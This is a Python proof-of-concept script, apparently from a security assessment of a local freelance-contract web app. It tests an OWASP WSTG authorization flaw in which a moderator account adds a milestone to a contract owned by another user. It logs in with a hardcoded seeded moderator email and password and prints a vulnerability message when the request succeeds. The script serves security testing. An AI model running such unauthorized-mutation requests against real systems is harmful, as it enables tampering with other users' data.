"""
WSTG-ATHZ-03 / WSTG-ATHZ-02: Unauthorized contract mutation.
Expected: a moderator can add a milestone to a contract owned by another user.
"""
import time
import requests

BASE = "http://localhost:3000"
FREELANCER_ID = "3fcfb3b4-8335-4b13-b813-3d425c3ecf7e"

stamp = str(int(time.time()))
reg = requests.post(f"{BASE}/api/auth/register", json={
    "email": f"wstg_mutator_{stamp}@example.com",
    "username": f"wstgmutator{stamp}",
    "password": "StrongPass1234",
    "display_name": "WSTG Mutator",
}, timeout=10).json()
client_token = reg["token"]

created = requests.post(f"{BASE}/api/contracts", json={
    "freelancer_id": FREELANCER_ID,
    "title": f"WSTG contract {stamp}",
    "description": "Authorization test contract",
    "amount": 500,
    "milestones": [{"title": "Initial milestone", "amount": 500}],
}, headers={"Authorization": f"Bearer {client_token}"}, timeout=10)
contract = created.json()
print("Contract create:", created.status_code, contract["id"])
assert created.status_code == 201

mod = requests.post(f"{BASE}/api/auth/login", json={
    "email": "carol.mod@hireflow.com",
    "password": "password123",
}, timeout=10).json()
mod_token = mod["token"]

mut = requests.post(f"{BASE}/api/contracts/{contract['id']}/milestones", json={
    "title": "Moderator extra milestone",
    "amount": 77,
}, headers={"Authorization": f"Bearer {mod_token}"}, timeout=10)
print("Mutation:", mut.status_code, mut.text)
assert mut.status_code == 201
print("\n[VULNERABLE] Non-party moderator modified another users' contract")
